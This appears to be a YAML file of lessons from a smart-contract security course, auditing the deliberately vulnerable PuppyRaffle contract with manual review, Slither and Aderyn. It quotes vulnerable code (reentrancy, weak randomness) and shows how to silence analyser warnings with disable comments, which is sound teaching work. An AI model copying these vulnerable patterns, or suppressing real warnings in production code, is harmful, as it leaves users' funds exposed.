          At this point we've completed our first thorough review of the code base. We should definitely go back and reassess events, as well as dedicate some time considering state variables - but for the most part, we've completed an initial review!

          This would be a great stage to go back through our notes and begin answering some of the questions we've been leaving ourselves.

          ```js
          // Were custom reverts a thing in 0.7.6 of solidity?
          // - No!
          // What if the players.length == 0?
          // - still emits an event when creating the raffle?
          // etc...
          ```

          We likely have a tonne of questions at this point and it's good practice to now answer them. Going through our previous questions might even generate new ones - but we keep at the process until we have a solid understanding of how everything should and does work.

          Usually one pass of a code base isn't going to be enough. If there are unanswered questions, it's a good sign that you need to go deeper.

          In the next lesson, we'll answer more of our questions, but I challenge you to go through some and try to find answers on your own before continuing!
        description: 'PuppyRaffle walkthrough continues, covering functions & exploits. Go through code multiple times for understanding. Identify areas for improvement.'
      -
        id: 7dddf0d6-a1fb-437a-89f6-fee77fd3a680
        type: new_lesson
        enabled: true
        title: 'Answering our questions'
        slug: answering-our-questions
        duration: 4
        video_url: vrEL95cQXxkqmfLeKALFEHE19FFJ00avx101R01EPi1ltg
        raw_markdown_url: /routes/security/4-puppy-raffle/37-answering-our-questions/+page.md
        markdown_content: |-
          ---
          title: Answering Our Questions
          ---

          _Follow along with this video:_

          ---

          ### Answering Our Questions

          This lesson will be a little unconventional. I'm going to list some of the questions that were raised as we performed our recon on Puppy Raffle. I want you to challenge yourself to answer these questions, then compare to my answers below!

          Questions:

          ```js
          // Q1: What resets the players array?

          // Q2: What if enterRaffle is called with an empty array?

          // Q3: In the case of getActivePlayerIndex - what if the player is at Index 0?

          // Q4: Does the selectWinner function follow CEI?

          // Q5: Are raffleDuration and raffleStartTime being set correctly?

          // Q6: Why not use address(this).balance for the totalAmountCollected in the selectWinner function?

          // Q7: Is the 80% calculation for winners rewards correct?

          // Q8: Where do we increment the totalSupply/tokenId?

          // Q9: Can a user simply force the selectWinner function to revert if they don't like the results?

          // Q10: What happens if the winner is a contract with broken or missing receive/fallback functions?

          // Q11: What happens if the feeAddress is a contract with broken or missing receive/fallback functions?
          ```

          ---

          <details>
          <summary>Answers!</summary>

          ```js
          // A1: The players array is reset in the selectWinner function.

          ...
          delete players;
          raffleStartTime = block.timestamp;
          previousWinner = winner;
          (bool success,) = winner.call{value: prizePool}("");
          ...

          // A2: If an empty array is submitted, an event is still emitted by the function. This will likely go in our report.

          ...
          function enterRaffle(address[] memory newPlayers) public payable {
                  require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
                  ...
                  emit RaffleEnter(newPlayers);
              }
          ...

          // A3: A player at index zero, may believe they are not active in a raffle, as this function returns zero if a player is not found. This will also go in our report for sure.

          ...
          function getActivePlayerIndex(address player) external view returns (uint256) {
                  for (uint256 i = 0; i < players.length; i++) {
                      if (players[i] == player) {
                          return i;
                      }
                  }
                  return 0;
              }
          ...

          // A4: No, the selectWinner function doesn't follow CEI and we would recommend to the protocol that it does. However, I happen to know this isn't an issue in this function, so we might flag this as informational.

          // A5: They are being set in the constructor and seem to be configured properly.

          ...
          constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
                  entranceFee = _entranceFee;
                  feeAddress = _feeAddress;
                  raffleDuration = _raffleDuration;
                  raffleStartTime = block.timestamp;
          ...

          // A6: This may be a design choice, but without clear rationale or a protocol to ask, we may flag this as informational for now.

          // A7: Yes, as per the documentation, 80% should be sent to the winner with 20% being retained in fees.

          // A8: This is handled by the OpenZeppelin ERC721.sol contract. Ultimately being set by this declaration when a winner is selected:

          ...
          uint256 tokenId = totalSupply();
          ...

          // A9: Yes! This will probably be an issue we'll want to add to our report.

          // A10: The winner wouldn't be able to receive their reward! This is definitely something we should report as a vulnerability.

          // A11: Sending funds to the feeAddress with the withdrawFees function will probably fail, but this is very low impact as the owner can simply change the feeAddress.
          ```

          </details>
        description: "Going back through the notes we left ourselves and answering some of the questions we'd asked!"
      -
        id: 5953da27-94eb-44a6-a7ec-250b4637ea5f
        type: new_lesson
        enabled: true
        title: 'Info and gas findings'
        slug: info-and-gas-findings
        duration: 5
        video_url: UmO71NH6ERcRe9tuR00ekLefSee2jX82Ld00D01GJQlAew
        raw_markdown_url: /routes/security/4-puppy-raffle/38-info-and-gas-findings/+page.md
        markdown_content: |-
          ---
          title: Info and Gas Findings
          ---

          _Follow along with this video:_

          ---

          ### Info and Gas Findings

          With all our questions answered, there still remain a few outstanding items we should consider.

          We briefly ran Slither earlier in this section, but didn't look too closely at what its output was. We should definitely return to this. Additionally, as people who have gone through the Foundry course should recognize, this code base is not adhering to any design pattern best practices, and regularly chooses poor naming conventions.

          Let's review a few recommendations we could make to improve the code for this protocol.

          ### Starting at the Top

          The first thing we notice, at the very top of this repo are the naming conventions used for storage variables.

          <img src="../../../../static/security-section-4/38-info-and-gas/info-and-gas1.png" style="width: 75%; height: auto;">

          A convention I like to use for storage variables is the `s_variableName` convention! So this may be an informational finding we would want to submit.

          Even further up the contract there's a bigger concern however.

          ```js
          pragma solidity ^0.7.6
          ```

          This statement is what's known as a `floating pragma`. It essentially denotes that the contract is compatible with solidity versions up to and including `0.7.6`. This brings a number of concerns including vulnerabilities across multiple versions, so best practice is to use a single version of solidity.

          This would be a great informational finding to include in our report.

          ### Further Recommendations

          Progressing down the code base, the next thing I notice are these statements:

          ```js
          uint256 prizePool = (totalAmountCollected * 80) / 100;
          uint256 fee = (totalAmountCollected * 20) / 100;
          ```

          When raw numbers are used in a code body like this, we refer to them as `Magic Numbers`. They provide no context of what they're doing. Best practice would be to assign these to named constants.

          ```js
          uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
          uint256 public constant FEE_PERCENTAGE = 20;
          uint256 public constant POOL_PRECISION = 100;

          uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
          uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
          ```

          The last thing I'll point out is best verified through the project's `foundry.toml`. Here we can see the versions of the libraries being imported for the protocol.

          A good practice will be to investigate the specific versions being used for reported issues and security advisories.

          We can navigate to the OpenZeppelin security section [**here**](https://github.com/OpenZeppelin/openzeppelin-contracts/security).

          This section of the OpenZepplin repo is kept updated with known security vulnerabilities within various versions of the OpenZeppelin library.

          By clicking on one of the advisories, we get a detailed breakdown including the affected versions.

          <img src="/security-section-4/38-info-and-gas/info-and-gas2.png" style="width: 75%; height: auto;">

          ### Gas

          In addition to informational findings in an audit, it can be optional to include gas recommendations for the protocol as well, though static analysis tools are getting really good at this and they're certainly becoming less common.

          One example of such a suggestion in Puppy Raffle would be regarding `raffleDuration`. Currently this is a storage variable, but this never changes. Puppy Raffle could absolutely change this to be a `constant` or `immutable` variable to save substantial gas.
        description: 'Improving code quality through an audit: Use specific Solidity versions, define constants, check library security, make storage variables immutable.'
      -
        id: 81cfb5f7-8d5b-44d1-abc6-860e8e2921c5
        type: new_lesson
        enabled: true
        title: 'Pit stop'
        slug: pit-stop
        duration: 2
        video_url: 6EUWIh9H6ExxyBWHW3D5302g2lCyp4bgm7OTXD00jT00lw
        raw_markdown_url: /routes/security/4-puppy-raffle/39-pit-stop/+page.md
        markdown_content: |-
          ---
          title: Pit Stop
          ---

          _Follow along with this video:_

          ---

          ### Pitstop

          At this point we're nearly done. We've two outstanding things to cover.

          The first will be running through the `Slither` and `Aderyn` reports for Puppy Raffle and finally we'll check the code quality/tests for this repo.

          Once we've completed those steps, I'm going to walk you through `Competitive Audits` on CodeHawks and how to submit a finding!

          Then, the very last thing we'll do in this section is write our Puppy Raffle report, with PoCs. We won't always be going through the entire reporting process together. It can be time intensive, but it's important for you to practice these skills on your own. This is your opportunity to test yourself, gain insights, and prepare for future competitive audits.

          You can find the Puppy Raffle final report in markdown within the [**audit-data branch**](https://github.com/Cyfrin/4-puppy-raffle-audit/tree/audit-data/audit-data) of the repo, along with a PDF version. You will also find the output of our `Aderyn` and `Slither` reports there, in case you want to compare yours and ensure its correctness.

          That's it! By the end you'll have another professional audit report to add to your security review portfolio.

          In the next lesson, we start with Slither!
        description: 'Conducting Code Quality Test Using Slither & Aderyn Tools; Practice Tips Given by Patrick.'
      -
        id: 7193c982-2dae-435b-bf60-f6848ca9b475
        type: new_lesson
        enabled: true
        title: 'Slither walkthrough'
        slug: slither-walkthrough
        duration: 13
        video_url: 8xCUno78bcmNZZHYAMBcOyZG2m5NkhN8qhfdpFhMkN4
        raw_markdown_url: /routes/security/4-puppy-raffle/40-slither-walkthrough/+page.md
        markdown_content: |-
          ---
          title: Slither Walkthrough
          ---

          _Follow along with this video:_

          ---

          ### Slither Static Analysis

          Alright, let's take a closer look at some of the issues Slither was able to find in our code base earlier. These will include, but aren't limited to, each of these.

          - Using incorrect Solidity versions
          - Missing/wrong events
          - Event reentrancy
          - Zero address checks
          - Supply chain attacks
          - Cache storage variables for loops
          - Unchanged variables marked as immutable or constant

          Start by running `slither .` just as before and let's dive into the output starting at the most severe

          ### Slither Highs

          <img src="/security-section-4/40-slither-walkthrough/slither-walkthrough1.png" width="75%" height=auto>

          **1. Sends Eth to Arbitrary User**

          - Dangerous Calls: `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#160)`

          Taking a look at this call in our code base, we see it's in the `withdrawFees` function.

          ```js
          function withdrawFees() external {
              require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
              uint256 feesToWithdraw = totalFees;
              totalFees = 0;
              // (bool success,) = feeAddress.call{value: feesToWithdraw}("");
              require(success, "PuppyRaffle: Failed to withdraw fees");
          }
          ```

          So, `Slither` is telling us that our feeAddress is arbirary and may be malicious. Let's look at the attack vector in the [**`Slither` documentation**](https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations).

          The documentation outlines that since our `feeAddress` can be changed, whomever receives funds from `withdrawFees` could theoretically be anybody. However, in `PuppyRaffle`, the `feeAddress` can only be changed by the `owner`, so this would be considereed intention in our protocol.

          ```js
          function changeFeeAddress(address newFeeAddress) external onlyOwner {
              feeAddress = newFeeAddress;
              emit FeeAddressChanged(newFeeAddress);
          }
          ```

          Conveniently, by using the syntax `// slither-disable-next-line [DETECTOR_NAME]`, we can tell Slither to ignore this warning:

          ```js
          // slither-disable-next-line arbitrary-send-eth
          (bool success,) = feeAddress.call{value: feesToWithdraw}("")
          ```

          **2. Uses a Weak PRNG**

          - Dangerous Calls:
            - `winnerIndex = uint256(keccak256(bytes)(abi.encodePacked(msg.sender,block.timestamp,block.difficulty))) % players.length (src/PuppyRaffle.sol#127-128)`

          This is the same vulnerability we detected! We can have slither ignore this line with:

          ```js
          // slither-disable-next-line weak-prng
          uint256 winnerIndex =
          uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
          ```

          ### Slither Mediums

          <img src="/security-section-4/40-slither-walkthrough/slither-walkthrough2.png" width="75%" height=auto>

          **1. Performs a Multiplication on the Result of a Division**

          - Dangerous Calls:
            - `encodedLen = 4 * ((data.length + 2) / 3) (lib/base64/base64.sol#22)`
            - `decodedLen = (data.length / 4) * 3 (lib/base64/base64.sol#78)`

          These issues are actually being detected in one of the libraries we're using, `Base64`. For the purposes of this section, we won't be going through our libraries, but what I want you to take away is that we need to assure our libraries, inheritances and dependencies are compatible, and these are generally warnings that are worth investigation.

          You can have slither ignore these by navigating to `lib/base64/base64.sol#22` and `lib/base64/base64.sol#78` to prepend the line:

          ```js
          // slither-disable-next-line divide-before-multiply
          ```

          **2. Uses a Dangerous Strict Equality**

          - Dangerous Calls:
            - `require(bool,string)(address(this).balance == uint256(totalFees),PuppyRaffle: There are currently players active!) (src/PuppyRaffle.sol#158)`

          This is another one we caught during our manual review! The warning here is pointing to our previous `Mishandling of Eth` finding.

          We can have slither ignore this warning with:

          ```js
          // slither-disable-next-line incorrect-equality
          ```

          **3. Reentrancy in PuppyRaffle.refund(uint256)**

          - Dangerous Calls:
            - External calls:
              - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#102)`
            - State variables written after the call(s):
              - `players[playerIndex] = address(0) (src/PuppyRaffle.sol#104)`

          We found this one too! Don't get me started talking about reentrancy again. Know it, protect against it.

          You can have `Slither` ignore this one by adding this to the line before our external call:

          ```js
          // slither-disable-next-line reentrancy-no-eth
          payable(msg.sender).sendValue(entranceFee);
          ```

          **4. Ignores Return Value by {function call}**

          - Dangerous Calls:
          - <details>
            <summary>Call Summary</summary>

            - `(tokenId) = _tokenOwners.at(index) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#181)`

            - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#339)`
            - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#341)`
            - `_holderTokens[owner].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#369)`
            - `_tokenOwners.remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#371)`
            - `_holderTokens[from].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#396)`
            - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#397)`
            - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#399)`
            </details>

          ---

          You can remove these warning from your `Slither` report by navigating to the respective lines for each call in the library and adding:

          ```js
          // slither-disable-next-line unused-return
          ```

          ### Slither Lows

          <img src="/security-section-4/40-slither-walkthrough/slither-walkthrough3.png" width="75%" height=auto>

          **1. Lacks a Zero Check**

          - Dangerous Calls:
            - `feeAddress = _feeAddress (src/PuppyRaffle.sol#63)`
            - `feeAddress = newFeeAddress (src/PuppyRaffle.sol#170)`

          `feeAddress` is assigned in our `constructor` and the `changeFeeAddress` function. `Slither` is advising that we include a check to assure the `feeAddress` isn't being set to `address(0)`.

          That sounds like a valid informational finding to me. Let's add it to our notes above each function!

          ```js
          // @Audit: Info - check for zero address when setting feeAddress
          ```

          These sorts of finds are often referred to as `input validation` and the severity is typically deemed informational.

          We can have our `Slither` report remove these warnings once we've made note of them, but adding this line to `PuppyRaffle` before assigning our `feeAddress` in our `constructor` and the `changeFeeAddress` functions:

          ```js
          // slither-disable-next-line missing-zero-check
          ```

          **2. Reentrancy in PuppyRaffle.refund/selectWinner**

          - Dangerous Calls: - <details open>
            <summary>Call Summary</summary>
            PuppyRaffle.refund

                    - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#103)`

                    PuppyRaffle.selectWinner

                    -  `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#152)`
                    - `_safeMint(winner,tokenId) (src/PuppyRaffle.sol#154)`
                    - `returndata = to.functionCall(abi.encodeWithSelector(IERC721Receiver(to).onERC721Received.selector,_msgSender(),from,tokenId,_data),ERC721: transfer to non ERC721Receiver implementer) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#447-450)`
                    - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)`
                  </details>

                  ---

            Now, you may be asking yourself _These are reentrancy, why aren't they high!?_.

          Well, these warnings are specifically pointing to the vulnerability described by the manipulation of the order or value of events being emitted. By reentering these functions an attacker is able to manupulate the events being emitted and potentially compromise third party reliance on them.

          There's a lot of debate about what kind of severity should be ascribed to event based findings, but my personal rule of thumb is that they are _at least_ `Low Severity`. Examples include:

          - If an event can be manipulated
          - If an event is missing
          - If an event is wrong

          I would add these to my notes for an audit report.

          ```js
          // @Audit: Low - Events affected by reentrancy
          ```

          We can remove these warnings from `Slither` by navigating to the reported lines and adding the following as appropriate:

          ```js
          // slither-disable-next-line reentrancy-events
          ```

          In your refund function, you may try to disable 2 checks for the same line. In order to do this, separate your ignore directives with a comma:

          ```js
          // slither-disable-next-line reentrancy-no-eth, reentrancy-events
          ```

          **3. Uses Timestamp for Comparisons**

          - Dangerous Calls:
            - `require(bool, string)(block.timestamp >= raffleStartTime + raffleDuration, PuppyRaffle: Raffle not over) (src/PuppyRaffle.sol#136)`

          Technically relying on `block.timestamp` means this _would_ be vulnerable to manipulation, but realistically only by a few seconds. For the purposes of this section we'll ignore it for now.

          You can have `Slither` ignore it too with:

          ```js
          // slither-disable-next-line timestamp
          ```

          **4. Uses Assembly**

          - Dangerous Calls:
            - `INLINE ASM (lib/base64/base64.sol#28-63)`
            - `INLINE ASM (lib/base64/base64.sol#84-126)`
            - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#33)`
            - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#180-183)`

          In short - Slither doesn't like Assembly. We'll be going over Assembly much later in this course, for now we'll be ignoring these warnings.

          You can remove these detectors/warnings by adding the following to the appropriate lines:

          ```js
          // slither-disable-next-line assembly
          ```

          **5. Different Versions of Solidity Are Used**

          - Dangerous Calls:

            - <details>
                <summary>Call Summary</summary>

              - `Version used: ['>=0.6.0', '>=0.6.0<0.8.0', '>=0.6.2<0.8.0', '^0.7.6']`
              - `>=0.6.0 (lib/base64/base64.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/access/Ownable.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/ERC165.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/IERC165.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/math/SafeMath.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Context.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol#3)`
              - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Strings.sol#3)`
              - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol#3)`
              - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol#3)`
              - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol#3)`
              - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Address.sol#3)`
              - `^0.7.6 (src/PuppyRaffle.sol#2)`

            </details>

          This is where `Slither` is pointing out the `Floating Pragma` vulnerability we outlined earlier. This will definitely be going in our report as an informational finding.

          Unfortunately `Slither` doesn't offer a per-file or line disabling of this detector, but we can remove it by adding the following to a `.slither.config.json` that we create:

          ```js

          "detectors_to_exclude":[
              "solc-version"
          ]

          ```

          Then add this line to the appropriate files:

          ```js
          // slither-disable-next-line pragma,solc-version
          ```

          **6. solc 0.7.6 is not Recommended for Deployment**

          - Dangerous Calls:
            - `PuppyRaffle.sol solc version 0.7.6`

          Slither's documentation tells us that this is an old version of Solidity and that we're not taking advantage of Solidity updates or new security checks. This is a great finding and should definitely be added to our report.

          ```js
          // @Audit: Info - Should use updated solv version such as 0.8.18
          ```

          **7. {function} is Never Used and Should be Removed**

          - Dangerous Calls
            - `PuppyRaffle._isActivePlayer() (src/PuppyRaffle.sol#180-187)`

          We called this one out as an informational/gas finding as well. You can disable this detector in `Slither` by adding this line above the function:

          ```js
          // slither-disable-next-line dead-code
          ```

          **8. Low Level Call**

          - Dangerous Calls:

            - <details>
              <summary>Call Summary</summary>

              - `(success) = recipient.call{value: amount}() (lib/openzeppelin-contracts/contracts/utils/Address.sol#60)`
              - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#128)`
              - `(success,returndata) = target.staticcall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#156)`
              - `(success,returndata) = target.delegatecall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#183)`
              - `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#154)`
              - `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#167)`
              </details>

          ---

          Much like Assembly, `Slither` doesn't like low level calls. We'll be ignoring these for now, but you can remove them from your warnings by applying this line above the described calls.

          ```js
          // slither-disable-next-line low-level-calls
          ```

          **9. Not in mixedCase**

          - Dangerous Calls:
            - `Parameter Base64.decode(string)._data (lib/base64/base64.sol#68)`
            - `Parameter ERC721.safeTransferFrom(address,address,uint256,bytes)._data (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#247)`

          These are simply pointing out naming convention concerns in a couple of our libraries. We'll ignore these as well, but you can remove them from the `Slither` warnings with:

          ```js
          // slither-disable-next-line naming-convention
          ```

          **10. Redundant Expression**

          - Dangerous Calls:
            - `"this (lib/openzeppelin-contracts/contracts/utils/Context.sol#21)" inContext (lib/openzeppelin-contracts/contracts/utils/Context.sol#15-24)`

          Another warning from a depedency of ours, we'll ignore this, but if you want to remove it you can add the line:

          ```js
          // slither-disable-next-line redundant-statements
          ```

          **11. Variable is Too Similar**

          - Dangerous Calls
            - `Base64.TABLE_DECODE (lib/base64/base64.sol#10-13) is too similar to Base64.TABLE_ENCODE (lib/base64/base64.sol#9)`

          **_ANOTHER_** warning from the libraries we're using. We can remove it with this line:

          ```js
          // slither-disable-next-line similar-names
          ```

          Now, at this point, you're probably annoyed by all the libraries `Slither` has been catching things in. What if I told you there's a better way to exclude them all at once?!

          By running `Slither . --exclude-dependencies` we can actually run our tool and have it ignore anything detected in our imports!

          **12. Cached Array Length**

          - Dangerous Calls:
            - `Loop condition j < players.length (src/PuppyRaffle.sol#90)`
            - `Loop condition i < players.length (src/PuppyRaffle.sol#114)`
            - `Loop condition i < players.length (src/PuppyRaffle.sol#182)`

          Here's a vulnerability we missed!

          Any time we're looping through players.length in this way, we're using far more gas than should be necessary. We should cache this value so we're only calling it from storage once.

          ```js
          // @Audit: We should cache the players.length array when looping - uint256 playersLength = players.length;
          ```

          We can remove this warning from the `Slither` report by adding this line before our loops:

          ```js
          // slither-disable-next-line cache-array-length
          ```

          **13. Storage Variables can be Declares Constant**

          - Dangerous Calls:
            - `PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#40)`
            - `PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#50)`
            - `PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#45)`

          A great finding, absolutely these storage variables should be constants, we're setting them once and they never change, a big potential gas savings.

          ```js
          // @Audit: These Storage Variables can be Constants
          string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8"
          string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
          string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
          ```

          We can filter these warnings from our `Slither` report with the line:

          ```js
          // slither-disable-next-line
          ```

          **14. State Variables can be Immutable** - Dangerous Calls: - `PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#25)`

          Likewise, this is a great call by `Slither` our raffleDuration is being set once and cannot be changed. Setting this to immutable would offer additional gas savings. Absolutely added to the report.

          ```js
          // @Audit: Unchanging state variables can be declared as immutable
          uint256 public raffleDuration;
          ```

          This warning can be removed from the `Slither` report with:

          ```js
          // slither-disable-next-line immutable-states
          ```

          ### Wrap Up

          Wow. This may have seemed a bit tedious, but look how much we've found and how much better we understand what `Slither` is able to detect. `Slither`, if nothing else, is great at finding gas optimizations, but beyond that it found issues we thought we needed to manually review for.

          Had PuppyRaffle ran `Slither` before coming to audit, their code base would have been in a much better starting place.

          Up next, let's see what `Aderyn` can do for Puppy Raffle!
        description: 'Slither is a static analysis tool that is useful for securing smart contracts. A walkthrough of its use.'
      -
        id: 3968e2b8-4bc5-445c-83f8-2841f2eb3ae3
        type: new_lesson
        enabled: true
        title: 'Aderyn walkthrough'
        slug: aderyn-walkthrough
        duration: 3
        video_url: jCUWPhEGzeaIcp5dJhEw4g7l8aJ4NOf00CgKD5G7Cq00Q
        raw_markdown_url: /routes/security/4-puppy-raffle/41-aderyn-walkthrough/+page.md
        markdown_content: |-
          ---
          title: Aderyn Walkthrough
          ---

          _Follow along with this video:_

          ---

          ### Aderyn Static Analysis

          Next, let's see what `Aderyn` can do for the Puppy Raffle repo. We'll assess each of the findings in turn. Some of which will include:

          - Centralization Risks
          - Dynamic Types & abi.encodePacked
          - Non-Indexed Events

          We can start by running `aderyn .`. This should generate an already formatted markdown report for us. Once run, open `report.md`

          ### Aderyn Mediums

          **1. Centralization Risk for Trusted Owners**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 180](src/PuppyRaffle.sol#L180)

                ```solidity
                    function changeFeeAddress(address newFeeAddress) external onlyOwner {
                ```

            This vulnerability is likely to crop up more and more as time goes on, unfortunately. In the context of Puppy Raffle, we're going to ignore it, all the owner can really do is change the feeAddress. This is absolutely something that should be called out in private audits.

          ### Aderyn Lows

          **1. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 213](src/PuppyRaffle.sol#L213)

                ```solidity
                            abi.encodePacked(
                ```

                - Found in src/PuppyRaffle.sol [Line: 217](src/PuppyRaffle.sol#L217)

                ```solidity
                                        abi.encodePacked(
                ```

            `Aderyn` here is pointing out that we should only use `encodePacked` for appropriate circumstances and that `encode` should be preferred to avoid hash collisions. We're going to ignore this for the purposes of this course, but I encourage you to investigate further to understand the reasoning here and find examples of hash collisions yourself.

          **2. Solidity pragma should be specific, not wide**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

                ```solidity
                pragma solidity ^0.7.6;
                ```

            We got this one! This is the same as our `Floating Pragma` finding.

          ### Aderyn Informational/Gas

          **1. Missing checks for `address(0)` when assigning values to address state variables**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

                ```solidity
                        feeAddress = _feeAddress;
                ```

                - Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)

                ```solidity
                        previousWinner = winner;
                ```

                - Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)

                ```solidity
                        feeAddress = newFeeAddress;
                ```

            We got this one! `zero address checks` wil be a common topic in security reviews you do. Familiarize yourself with spotting them!

          **2. Functions not used internally could be marked external**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)

                ```solidity
                    function enterRaffle(address[] memory newPlayers) public payable {
                ```

                - Found in src/PuppyRaffle.sol [Line: 105](src/PuppyRaffle.sol#L105)

                ```solidity
                    function refund(uint256 playerIndex) public {
                ```

                - Found in src/PuppyRaffle.sol [Line: 205](src/PuppyRaffle.sol#L205)

                ```solidity
                    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
                ```

            Puppy Raffle has these function marked as `public`, which is _fine_, but if they aren't used internally as well as externally, we can just mark them as `external` for a small gas savings.

          > **Note:** In the video, I assume this is referencing the `_getActivePlayer` function that is unused. Whoops!

          **3. Constants should be defined and used instead of literals**

          - Dangerous Calls - Found in src/PuppyRaffle.sol [Line: 94](src/PuppyRaffle.sol#L94)
            `solidity
              for (uint256 i = 0; i < players.length - 1; i++) {
              `

                - Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)

                ```solidity
                for (uint256 j = i + 1; j < players.length; j++) {
                ```

                - Found in src/PuppyRaffle.sol [Line: 141](src/PuppyRaffle.sol#L141)

                ```solidity
                uint256 prizePool = (totalAmountCollected * 80) / 100;
                ```
                - Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)

                ```solidity
                    uint256 fee = (totalAmountCollected * 20) / 100;
                ```
                - Found in src/PuppyRaffle.sol [Line: 148](src/PuppyRaffle.sol#L148)

                ```solidity
                    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
                ```

            `Aderyn` was a little too vigilant here, catching the `Magic Numbers` used in our for loops, but it also caught a `Magic Numbers` in the `prizePool` and `fee` calculations as well! We got this one earlier.

          **4. Event is missing `indexed` fields**

          - Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 59](src/PuppyRaffle.sol#L59)

                ```solidity
                    event RaffleEnter(address[] newPlayers);
                ```

                - Found in src/PuppyRaffle.sol [Line: 60](src/PuppyRaffle.sol#L60)

                ```solidity
                    event RaffleRefunded(address player);
                ```

                - Found in src/PuppyRaffle.sol [Line: 61](src/PuppyRaffle.sol#L61)

                ```solidity
                    event FeeAddressChanged(address newFeeAddress);
                ```

            Indexing fields ultimately makes it easier for off-chain tools to access the emitted event data. Indexing event parameters costs more gas however, so there's a trade-off. Not using indexed fields could be defended as a design choice, but in an ideal world, they would be indexed.

          ### Wrap Up

          That was quick! `Aderyn` is great in that this output is already formatted beautifully and we could reasonably just copy and paste it's finding into our report. Going through the outlined issues is a good practice however, as these static analysis tools paint with wide strokes and not everything caught may be applicable or valid.
        description: 'A brief walkthrough of Aderyn and how to use it to supercharge your smart contract security reviews.'
      -
        id: f012efb6-1547-4ce9-add5-cfcf024f0730
        type: new_lesson
        enabled: true
        title: 'Test coverage'
        slug: test-coverage
        duration: 1
        video_url: JbFWxsW4022U1kVcBMt00K3To7nnnWPrCAjYc5DaQMnKI
